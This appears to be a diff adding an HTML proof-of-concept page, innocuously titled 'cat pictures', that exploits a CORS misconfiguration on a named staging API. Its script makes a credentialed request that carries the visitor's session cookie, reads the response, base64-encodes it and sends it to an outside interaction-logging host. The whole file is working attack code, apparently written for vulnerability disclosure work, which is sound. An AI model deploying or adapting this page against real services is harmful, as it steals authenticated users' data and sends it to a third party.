@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>cat pictures</title>
+</head>
+<body>
+  <h2>CORS PoC &mdash; mom-staging.medable.com</h2>
+  <pre id="out">running...</pre>
+
+  <script>
+  // ---- config -------------------------------------------------------------
+  const TARGET = 'https://mom-staging.medable.com/v1/entities/55';
+  // NOTE: interactsh tokens expire. Regenerate before each run and update this.
+  const OAST   = 'https://ljcadbkawvtblrqnzzrrleawbtzpn3dd6.oast.fun';
+  // -------------------------------------------------------------------------
+
+  fetch(TARGET, { method: 'GET', credentials: 'include' })   // victim's md_idtoken cookie rides along
+    .then(r => r.text())
+    .then(body => {
+      // 1) on-page proof: attacker origin READ the credentialed response
+      document.getElementById('out').textContent =
+        'Cross-origin read SUCCEEDED from ' + location.origin + ':\n\n' + body;
+
+      // 2) exfil proof: ship stolen data to attacker-controlled host
+      const enc = btoa(unescape(encodeURIComponent(body)));            // transport-safe base64
+      fetch(OAST + '/exfil', { method: 'POST', mode: 'no-cors', body: enc });   // full body in POST
+      fetch(OAST + '/cors-poc/' + enc.slice(0, 200), { mode: 'no-cors' });      // visible path marker
+    })
+    .catch(e => {
+      document.getElementById('out').textContent = 'request blocked / failed: ' + e;
+    });
+  </script>
+</body>
+</html>
